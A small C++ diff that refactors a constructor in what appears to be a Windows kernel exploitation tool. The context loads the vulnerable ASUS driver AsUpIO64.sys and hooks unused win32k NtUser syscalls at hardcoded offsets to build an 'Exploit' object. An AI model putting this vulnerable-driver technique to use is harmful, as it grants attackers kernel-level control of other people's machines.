@@ -10,10 +10,7 @@ inline NtCall PointerTwo("NtUserSetPrecisionTouchPadConfiguration",0x66AD0); // 
 inline NtCall PointerThree("NtUserGetPrecisionTouchPadConfiguration",0x67500); // these can be any unused nt function in win32k
 class Kernel {
 public:
-    Kernel() {
-        Driver Asus("C:\\Windows\\System32\\drivers\\AsUpIO64.sys", "ASUS");
-        this->Asus = Asus;
-    }
+    Kernel() : Asus("C:\\Windows\\System32\\drivers\\AsUpIO64.sys", "ASUS") { }
     bool Initialize(bool Load) {
         if (!Load) {
             Exploit = Syscall(PointerOne, PointerTwo, PointerThree);
